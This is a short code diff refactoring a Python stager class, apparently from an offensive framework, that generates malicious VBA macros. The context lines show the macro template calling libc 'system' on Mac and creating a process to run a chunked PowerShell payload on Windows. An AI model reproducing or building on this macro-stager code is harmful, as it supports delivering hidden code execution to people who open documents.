@@ -128,8 +128,7 @@ class Stager:
                 )
                 str2 = '"\r\n'.join(holder)
             str2 = str2 + '"'
-            str1 = str1 + "\r\n" + str2
-            return str1
+            return str1 + "\r\n" + str2
 
         # extract all of our options
         language = self.options["Language"]["Value"]
@@ -194,7 +193,7 @@ class Stager:
             poshpayload += '\n\t\tstr = str + "' + str(poshchunk)
 
         # if statements below are for loading Mac dylibs for compatibility
-        macro = f"""#If Mac Then
+        return f"""#If Mac Then
     #If VBA7 Then
         Private Declare PtrSafe Function system Lib "libc.dylib" (ByVal command As String) As Long
     #Else
@@ -249,5 +248,3 @@ Public Function Debugging() As Variant
                 objProcess.Create str, Null, objConfig, intProcessID
             #End If
 End Function"""
-
-        return macro
